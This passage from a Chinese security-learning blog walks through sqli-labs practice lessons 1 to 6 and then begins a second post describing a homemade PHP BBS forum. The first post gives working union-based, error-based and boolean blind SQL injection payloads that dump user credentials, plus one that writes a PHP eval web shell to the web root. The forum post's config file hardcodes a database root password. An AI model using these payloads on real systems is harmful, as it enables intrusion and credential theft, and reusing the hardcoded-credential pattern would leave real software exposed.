将目标str转化为目标数据类型<br><strong>8、IFNULL(expr1,expr2)</strong><br>如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2<br><strong>9、updatexml()</strong><br><code>updatexml(1,concat(0x7e,user(),0x7e),1)</code><br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误显示user()该函数。但显示出来的内容最多只有32个字符串；利用原理对他是对XML文档进行更新的函数；<br>语法：updatexml(目标xml文档，xml路径，更新的内容)<br><strong>10、extractvalue()</strong><br>extractvalue也是运用于报错sql注入；利用原理对XML文档进行查询的函数；<br>语法：extractvalue(目标xml文档，xml路径)<br><strong>熟悉mysql常见的判断语句函数</strong><br>参考文章<a href="https://www.runoob.com/mysql/mysql-functions.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-functions.html</a><br><strong>11、LOAD_FILE</strong><br>可以利用该函数，进写入shell<br>用法：<code>select load_file(‘file1’) into outfile ‘file2’</code><br>将file1的文件导入WEB目录file2的文件中进行访问！</p><p>例：</p><pre><code class="sql">?id=1’)) union select 1,2,’&lt;?php* [@eval](http://github.com/eval)*($_POST[“cmd”]);?&gt;’ into outfile “/home/wwwroot/default/test.php”—+*</code></pre><p>看完后，有了大致了解，是时候开启注入攻关之旅了。。</p><h4 id="一、错误型-GET注入"><a href="#一、错误型-GET注入" class="headerlink" title="一、错误型-GET注入"></a>一、错误型-GET注入</h4><p>大致思路：<strong>闭合-&gt;输入sql查询(这里是联合查询)语句-&gt;注释后边条件</strong></p><p>因为<code>错误型GET注入</code>过于基础，所以这一部分直接构造payload，开始注入了。。</p><h4 id="1、Less-1错误型GET单引号字符型注入"><a href="#1、Less-1错误型GET单引号字符型注入" class="headerlink" title="1、Less-1错误型GET单引号字符型注入"></a>1、Less-1错误型GET单引号字符型注入</h4><p>单引号字符型注入：通过<code>&#39;</code>的报错进行sql查询，并用mysql能输出字符串型的函数，获取我们想要的数据。</p><p><strong>1、发现注入点</strong></p><p>输入<code>?id=1</code> 正常；</p><p>输入<code>?id=1&#39;</code> 报错，就存在sql注入漏洞。</p><p><strong>2、猜id=1显示条件中表的字段</strong></p><p>例如输入<code>?id=1&#39; order by 3 --+</code> 显示正常<br>再次输入<code>?id=1&#39; order by 4 --+</code> 显示错误</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjg3NjA5ZjViYmVkYjQ5Yy5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvN2NjZmY0YWYyMjVjNGYyOS5qcGc" alt></p><p>所以我得出，在<code>?id=1</code>查看的这个表有3个字段</p><p><strong>3、爆数据库</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39; union select 1,2,database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzBmODkwNjVmODhhZDE2Mi5qcGc" alt></p><p><strong>4、爆数据表</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGViNjJjMjQ0MWJhNDgyZS5qcGc" alt></p><p><strong>5、爆数据列(字段)</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNTA3OTgzMmZlZmIzNzQ3My5qcGc" alt></p><p><strong>6、爆数据值</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39; union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMGYxOTEwOTA0ZWExMTYxYS5qcGc" alt></p><h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><p>1、<code>union select 1,group_concat(table_name),3</code><br><code>?id=-1</code>等于我们要查询的表，在实验第一步时候，我们得到该查询的表有3个字段；所以我们在构建select时候，必须满足3个字段条件；<br>例如：<code>select 1,2,3</code> 那么 group_concat(table_name)表示2；这点有点像数组，你必须规定3个值，才能进行正常的赋值后显示。</p><p>2、<code>group_concat()</code><br>group_concat函数是典型的字符串连接函数；</p><p>3、0x3a<br><code>0x3a</code>是<code>:</code>16进制的分隔符,比如在爆开数据值使用中(username,0x3a,password)表示(username:password)</p><p>4、<code>information_schema</code><br>表示存储了数据<code>表tables</code> <code>列columns</code>的元数据信息;用法：常规的sql查询中from xxx查询的元素或表 where xxx查询的条件；<br>5、<code>database()</code><br>列出数据库的库名；<br>6、<code>table_schema=database()</code><br>累出数据库的表名，这里存在赋值</p><h4 id="2、Less-2错误型GET整型注入"><a href="#2、Less-2错误型GET整型注入" class="headerlink" title="2、Less-2错误型GET整型注入"></a>2、Less-2错误型GET整型注入</h4><p>整型注入：提交的URL参数为整数类型</p><p>与<strong>Less-1错误型GET单引号字符型注入</strong> 区别在于，构建payload时去掉<code>&#39;</code>单引号</p><p><strong>1、爆数据库</strong></p><p>payload</p><pre><code class="sql">?id=-1 union select 1,2,database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjM1MmQ5NDIyN2RkMjM2ZC5qcGc" alt></p><p><strong>2、爆数据表</strong></p><p>payload</p><pre><code class="sql">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNTNlMjllMDg2NjJhMDI5Yi5qcGc" alt></p><p><strong>3、爆数据列(字段)</strong></p><p>payload</p><pre><code class="sql">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODMwMmNjMDI1ZDI4YjgxYy5qcGc" alt></p><p><strong>4、爆数据值</strong></p><p>payload</p><pre><code class="sql">?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYmVkMmVkYjg3NDcwMTc1OS5qcGc" alt></p><h4 id="3、Less-3错误型GET单引号变形字符型注入"><a href="#3、Less-3错误型GET单引号变形字符型注入" class="headerlink" title="3、Less-3错误型GET单引号变形字符型注入"></a>3、Less-3错误型GET单引号变形字符型注入</h4><p>常见SQL变形字符串注入：</p><ol><li>将查询条件转为<code>base64</code></li><li>本实验用<code>)</code>来实现变形；</li><li>宽字节字体编码利用，例如gbk中文字符，这种比较难用；例如试图用<code>%df%5c%27</code>试图在<code>%df%5c%27</code>为中文字符绕过<code>%27</code>PHP魔术引用的转义成<code>\%27</code>但也要取决于环境；故此宽字节去做sql注入的转义绕过很难。</li></ol><p>与<strong>Less-2错误型GET整型注入</strong>区别在于，构建payload新增<code>&#39;)</code>单引号，<code>)</code>表示变形！</p><p><strong>1、爆数据库</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39;) union select 1,2,database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvY2E4MTc0NGQzZTY3YWYzMi5qcGc" alt></p><p><strong>2、爆数据表</strong></p><p>pyload</p><pre><code class="sql">?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvM2FmOWFmMmU2MmEzNDgyYy5qcGc" alt></p><p><strong>3、爆数据列(字段)</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjdmYzdkY2NlNmRlNjIxMy5qcGc" alt></p><p><strong>4、爆数据值</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39;) union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzYwNWUxMDZlMDY5NmE2YS5qcGc" alt></p><h4 id="4、Less-4错误型GET双引号字符型注入"><a href="#4、Less-4错误型GET双引号字符型注入" class="headerlink" title="4、Less-4错误型GET双引号字符型注入"></a>4、Less-4错误型GET双引号字符型注入</h4><p>与<strong>Less-3错误型GET单引号变形字符型注入</strong>区别在于，构建payload更改为<code>&quot;)</code>双引号；<code>)</code>表示变形</p><p><strong>1、爆数据库</strong></p><p>payload</p><pre><code class="sql">?id=-1&quot;) union select 1,2,database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNWI5NWU4NjI2YjE3Yzg2NC5qcGc" alt></p><p><strong>2、爆数据表</strong></p><p>payload</p><pre><code class="sql">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOWIyYWI2NWVmMjMwN2MzZS5qcGc" alt></p><p><strong>3、爆数据列(字段)</strong></p><p>payload</p><pre><code class="sql">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZmJlNmFiNmM2NTE0MWRlNi5qcGc" alt></p><p><strong>4、爆数据值</strong></p><p>payload</p><pre><code class="sql">?id=-1&quot;) union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzk5NGE4NGE0ZmM3YjM3Yy5qcGc" alt></p><h3 id="二、双查询注入-报错注入-GET注入"><a href="#二、双查询注入-报错注入-GET注入" class="headerlink" title="二、双查询注入(报错注入)-GET注入"></a>二、双查询注入(报错注入)-GET注入</h3><p><strong>双注入：</strong></p><p>双注入就是嵌套子查询。</p><p>多走一条查询或者数据排序途径，获取想要的数据,例如select …(select …)，里面的那个select被称为子查询，它的执行顺序先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数利用：</p><p><em>rand()随机函数，返回0~1之间的某个值</em><br><em>floor(a)取整函数，返回小于等于a，且值最接近a的一个整数</em><br><em>count()聚合函数也称作计数函数，返回查询对象的总数</em><br><em>group by cluase分组语句，按照cluase对查询结果分组</em></p><p><strong>原理：</strong></p><p>当一个字符串函数，例如concat函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p><h4 id="5、Less-5双注入GET单引号字符型注入"><a href="#5、Less-5双注入GET单引号字符型注入" class="headerlink" title="5、Less-5双注入GET单引号字符型注入"></a>5、Less-5双注入GET单引号字符型注入</h4><p>先尝试一下<code>?id=-1&#39; union select 1,2,database() --+</code>进行爆库，发现报错了,但是union没有出结果。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMmE5YTg0YTgyMDM0OTMzNy5qcGc" alt></p><p>于是查询了一些相关知识和大佬的博客后。有了大致思路。</p><p>首先，查看一下源码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjEzNDJhZDgxNmVjOWQ2ZC5qcGc" alt></p><p>查询后发现：mysql_error() 函数返回上一个 MySQL 操作产生的文本错误信息。如果没有出错则返回 ‘’（空字符串）。</p><p>这样的话只能采取报错注入了。下面是我参考大佬博客得到的知识：</p><pre><code>(1)通过floor报错and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符(2)通过updatexml报错and updatexml(1,payload,1)同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效(3)通过ExtractValue报错and extractvalue(1, payload)输出字符有长度限制，最长32位。payload即我们要输入的sql查询语句</code></pre><p><em>floor报错注入即双查询注入</em></p><p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式。</p><pre><code class="sql">?id=1&#39; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23?id=1&#39; union select count(*),1, concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+?id=-1&#39; and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</code></pre><p>这些理解之后，就可以愉快的爆库、爆表、爆字段、报内容了。。。</p><p><strong>1、爆数据库</strong></p><p>payload</p><pre><code class="sql">?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNWExOTFiZDcxOTk1ZTEyNy5qcGc" alt></p><p>爆数据用户,将mysql系统函数database()改为user()即可。</p><p><strong>2、爆数据表</strong></p><p>当我尝试把爆数据库的payload改为爆数据表的payload时</p><pre><code class="sql">?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p>发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjExM2VmNTE0ZDM0YTNkMC5qcGc" alt></p><p>意思就是一次只能返回不超过一条数据。所以此时我使用limit进行限制</p><p>payload</p><pre><code class="sql">?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvY2FjOGE4N2UyYmY3NTczMy5qcGc" alt></p><p>查出结果了。。。同理，查其他数据表，把limit条件换一下就🆗了</p><p><strong>3、爆数据列(字段)</strong></p><p>和爆数据表类似，只是改变了下payload，开始尝试注入</p><pre><code class="sql">?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p>结果，并没有爆出什么内容。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzk1MjZlMWZkYTQzMjEyYy5qcGc" alt></p><p>于是，我仔细考虑了一下，发现当payload的条件where后再多加一个条件<code>table_schema=database()</code>爆出字段内容了。。。</p><p>payload</p><pre><code class="sql">?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDQ5NTM3YTQ5NjQ5ZTUyMS5qcGc" alt></p><p>同理，爆其他字段，改一下limit条件就好了。。。</p><p><strong>4、爆数据值</strong></p><p>这个与上面比，就稍微有点简单了。直接上payload，开始注入</p><p>payload</p><pre><code class="sql">?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(username,0x3a,password) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOTRlZjZlMDRmYTI3NzYyZS5qcGc" alt></p><p>直接爆出内容了。同理，爆其他数据值同上改limit条件。。</p><h4 id="6、Less-6双注入GET双引号字符型注入"><a href="#6、Less-6双注入GET双引号字符型注入" class="headerlink" title="6、Less-6双注入GET双引号字符型注入"></a>6、Less-6双注入GET双引号字符型注入</h4><p>与上一个实验<strong>Less-5双注入GET单引号字符型注入</strong>手法上几乎一致！区别在于payload中<code>&#39;</code>单引号改为<code>&quot;</code>双引号。</p><p>但我查询了一些大佬的博客，发现了另一种方法。方法如下：</p><p><strong>布尔型注入</strong></p><p>布尔型注入简称<code>盲注</code>，正确会回显，错误没有回显，以此为依据逐字进行想要的字段或者命名进行猜解爆破；在上面的实验中我们已知：数据库名<code>security</code>表名<code>users</code>字段<code>username</code> <code>password</code><br>手工注入时可使用例如<code>left((select database()),1)&lt;’s’</code> 这样的比较排序第几位的二分查找方法快速猜解爆破。</p><p>emmmm。。。。好像不太明白<code>left</code>有什么用，查查看。。。查询后了解到如下信息：</p><h5 id="Sql注入截取字符串常用函数"><a href="#Sql注入截取字符串常用函数" class="headerlink" title="Sql注入截取字符串常用函数"></a>Sql注入截取字符串常用函数</h5><p><strong>mid()函数</strong></p><p>此函数为截取字符串一部分。MID(column_name,start[,length])</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td></tr></tbody></table><p>例： str=”123456”     mid(str,2,1)    结果为2</p><p>Sql用例：</p><p>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p><p>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p><p> <strong>substr()函数</strong></p><p> Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p> string substring(string, start, length)</p><p> string substr(string, start, length)</p><p> 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>Sql用例：</p><p>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p><p>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。</p><p><strong>Left()函数</strong></p><p>Left()得到字符串左部指定个数的字符</p><p>Left ( string, n )        string为要截取的字符串，n为长度。</p><p>Sql用例：</p><p>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</p><p>(2) 同样的string可以为自行构造的sql语句。</p><p>同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p><p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p><p><strong>Sql注入截取字符串常用函数</strong><a href="https://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="noopener">原文链接</a></p><p>这些知识了解之后可以愉快的注入了。。。</p><p><strong>1、爆数据库</strong></p><p>payload1正确并有回显，表的开头排序第一位为s</p><pre><code class="sql">?id=1&quot; and left((select database()),1)=&#39;s&#39;--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDQwMTgyYmJjMmI0ZTZkYi5qcGc" alt></p><p>payload2正确并有回显，表的开头排序第一位不是i，但前面有i</p><pre><code class="sql">?id=1&quot; and left((select database()),1)&gt;&#39;i&#39;--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNmJmMjQwNjJhZmIxNWVhOS5qcGc" alt></p><p>payload3错误并无回显，表的开头排序第一位后面没有i</p><pre><code class="sql">?id=1&quot; and left((select database()),1)&lt;&#39;i&#39;--+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjY0ZWFhMmJmNzUzOTU5NS5qcGc" alt></p><p><code>left((select database()),1)&lt;&#39;s&#39;</code> 中<code>1</code>表示当前有1个字符取开头1个字符来猜测是否存在，这个顺序是前到后，是有顺序的。如果更换为<code>8</code>,那么就表示当前有8个字符取8个字符来猜测是否存在；所以<code>s</code>要改为<code>security</code>刚好8个字符8个排序，8个字符一起对比是正确还是错误。</p><pre><code class="sql">?id=1&quot; and left((select database()),8)=&#39;security&#39;--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191015225656442.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>这样，我可以得知表名为<code>security</code></p><p><strong>2、爆数据表</strong></p><p>payload1 从limit 的第1个数据第1行数据开始猜解</p><pre><code class="sql">?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;u&#39; --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzQ5MTE2NGNmNjIyMzFmYy5qcGc" alt></p><p>payload2 从limit 从第5条数据取第1条数据开始猜解；<code>limit 4,1</code> 表示第5条数据，程序世界的排序01234</p><pre><code class="sql">?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 4,1),1)=&#39;u&#39; --+</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzdjNDA2ZTFlMDI5YWNhYy5qcGc" alt></p><p>修改limit x,1和left中的位数限定数字，在第三张表爆破到user表，名为users</p><pre><code class="sql">?id=1&quot; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191015225212781.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p><p><strong>3、爆数据列(字段)</strong></p><p>与上面大致是同理的，所以直接上payload</p><pre><code class="sql">?id=1&quot; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),8)=&#39;password&#39; --+</code></pre><p><strong>4、爆数据值</strong></p><p>与上面大致是同理的，所以还是直接上payload</p><pre><code class="sql">?id=1&quot; and left((select password from users order by id limit 0,1),1)=&#39;d&#39; --+</code></pre><p>使用<code>order by</code>按照id来排序，limit 从0开始到需要的字段.最后爆破到第一个用户的名字dumb，密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p><p>布尔型的<code>盲注</code>，全靠猜。。。。。可以写个脚本猜，效率高点。</p><p>这篇博客暂且先总结那么多吧。。。。</p><p>在错误型和双注入的关卡中，又收获了好多。。继续努力，小白进阶ing。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GET型联合查询注入 </tag>
            
            <tag> GET型双查询注入 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发-简单BBS论坛</title>
      <link href="/2019/06/05/Web%E5%BC%80%E5%8F%91-%E7%AE%80%E5%8D%95BBS%E8%AE%BA%E5%9D%9B/"/>
      <url>/2019/06/05/Web%E5%BC%80%E5%8F%91-%E7%AE%80%E5%8D%95BBS%E8%AE%BA%E5%9D%9B/</url>
      
        <content type="html"><![CDATA[<p>开发了两周的bbs论坛系统，总算在上周完成了，并且已经把项目文件上传到github上了。<a href="https://github.com/qwzf/mybbs" target="_blank" rel="noopener">[我的bbs]</a>。。。</p><p>开发完之后，感觉对sql语句、mysql函数和PHP代码有了深刻的理解。同时了解了开发流程。。好像收获很多耶！！！总结一下吧。。。</p><h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><p><strong>需求</strong></p><ol><li>浏览者有<strong>浏览任何版块、任何帖子以及任何回复</strong>的权限，并且<strong>任何浏览者都有注册成为本论坛的用户</strong>的权限。</li><li>注册用户比浏览者多了<strong>发帖，回复帖子</strong>的权限，且具有<strong>成为某子版块版主</strong>的机会 </li><li>版主比注册用户多出<strong>删除本版块帖子和相关回复</strong>的权限 </li><li>管理员具有<strong>操作网站后台</strong>的权限(比如设置版块、更改站点信息、帖子管理、用户管理等) </li></ol><p><strong>功能</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716170335787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>数据库设计</strong> </p><p><em>1、数据库名称：</em>bbs </p><p><em>2、数据表：</em> </p><p>(1）father_module父版块表 字段：id、module_name、sort</p><p>(2）son_module子版块表 字段：id、father_module_id、module_name、info、member_id、sort </p><p>(3）member会员表 字段：id、username、password、photo、register_name、last_time </p><p>(4）content帖子表 字段：id、module_id、title、content、time、member_id、times </p><p>(5）reply帖子回复表 字段：id、content_id、quote_id、content、time、member_id </p><p>(6）manage管理员表 字段：id、username、password</p><p>(7)  info站点信息  字段：id、title、keywords、description</p><p><strong>程序目录结构</strong></p><p>admin/：存放后台程序文件 </p><p>inc/：存放被包含的文件 </p><p>style/：存放样式、图片 （后台我使用的是css\、fonts\和images。存放样式、图片）</p><p>uploads/：存放上传文件 </p><p>其他各种文件 </p><p><strong>开发步骤</strong> </p><ol><li>前台与后台的界面</li><li>后台-父版块</li><li>后台-子版块</li><li>前台-用户注册</li><li>前台-用户发帖</li><li>前台-帖子列表页</li><li>前台-帖子内容页</li><li>前台-帖子回复</li><li>前台-首页</li><li>前台-用户中心 </li></ol><p>等等… </p><h3 id="开发步骤实现"><a href="#开发步骤实现" class="headerlink" title="开发步骤实现"></a>开发步骤实现</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>因为写总结时，功能已经实现。所以把开发过程中的一些准备，直接都写出来了。</p><h5 id="mysql函数库"><a href="#mysql函数库" class="headerlink" title="mysql函数库"></a>mysql函数库</h5><p>在与admin同级目录inc/里创建一个php文件名为mysql.inc.php。并在文件里写入相关mysql函数。代码【<a href="https://github.com/qwzf/mybbs/blob/master/inc/mysql.inc.php" target="_blank" rel="noopener">mysql.inc.php</a>】</p><h5 id="相关设置"><a href="#相关设置" class="headerlink" title="相关设置"></a>相关设置</h5><p>同样在与admin同级目录inc/里创建一个php文件名为config.inc.php。里面包括设置时区、开启session、转换编码、设置数据库连接信息和找到绝对路径。代码如下：</p><pre><code class="php">&lt;?php date_default_timezone_set(&#39;Asia/Shanghai&#39;);//设置时区session_start();header(&#39;Content-type:text/html;charset=utf-8&#39;);define(&#39;DB_HOST&#39;,&#39;localhost&#39;);define(&#39;DB_USER&#39;,&#39;root&#39;);define(&#39;DB_PASSWORD&#39;,&#39;199910mm&#39;);define(&#39;DB_DATABASE&#39;,&#39;bbs&#39;);define(&#39;DB_PORT&#39;,3306);//项目（程序），在服务器上的绝对路径define(&#39;SA_PATH&#39;,dirname(dirname(__FILE__)));//项目在web根目录下面的位置（哪个目录里面）define(&#39;SUB_URL&#39;,str_replace($_SERVER[&#39;DOCUMENT_ROOT&#39;],&#39;&#39;,str_replace(&#39;\\&#39;,&#39;/&#39;,SA_PATH)).&#39;/&#39;);?&gt;</code></pre><h5 id="跳转和登录验证"><a href="#跳转和登录验证" class="headerlink" title="跳转和登录验证"></a>跳转和登录验证</h5><p>直接跳转，执行结果信息不太明确。可以设置跳转结果显示。如图：<br><img src="http://img-blog.csdnimg.cn/20190716170355119.jpg" alt="在这里插入图片描述"></p><p>于是把该功能写在了php文件tool.inc.php。该文件中也写了会员是否登录验证和管理员是否登录的验证。</p><p>代码【<a href="https://github.com/qwzf/mybbs/blob/master/inc/tool.inc.php" target="_blank" rel="noopener">tool.inc.php</a>】</p><h5 id="后台相关验证"><a href="#后台相关验证" class="headerlink" title="后台相关验证"></a>后台相关验证</h5><p>为了方便，我将admin目录里的inc/目录里的相关验证写在下面</p><p><strong>1.check_father_module.inc.php</strong></p><p><strong>2.check_login.inc.php</strong></p><p><strong>3.check_manage.inc.php</strong></p><p><strong>4.check_son_module.inc.php</strong></p><p><strong>5.is_manage_login.inc.php</strong></p><p>【<a href="https://github.com/qwzf/mybbs/tree/master/admin/inc" target="_blank" rel="noopener">相关代码</a>】</p><h5 id="后台删除确认页confirm-php"><a href="#后台删除确认页confirm-php" class="headerlink" title="后台删除确认页confirm.php"></a>后台删除确认页confirm.php</h5><p>【<a href="https://github.com/qwzf/mybbs/blob/master/admin/confirm.php" target="_blank" rel="noopener">代码地址</a>】</p><h4 